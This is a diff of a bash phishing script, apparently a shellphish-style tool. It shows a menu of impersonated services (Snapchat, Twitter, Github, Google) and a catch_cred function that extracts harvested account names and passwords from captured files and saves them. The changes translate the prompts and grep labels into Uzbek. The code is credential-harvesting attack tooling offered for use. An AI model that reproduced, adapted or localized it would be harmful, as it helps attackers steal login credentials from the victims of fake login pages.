@@ -25,7 +25,7 @@ printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m]\e[0m\e[1;93m Github\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m6\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m\n"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Bolimni tanlang: \e[0m\en' option
+read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Bo`limni tanlang: \e[0m\en' option
 
 
 if [[ $option == 1 ]]; then
@@ -86,9 +86,9 @@ printf "\n"
 
 catch_cred() {
 
-account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
+account=$(grep -o 'Akkaunt:.*' sites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
-password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
+password=$(grep -o 'Parol:.*' sites/$server/usernames.txt | cut -d ":" -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
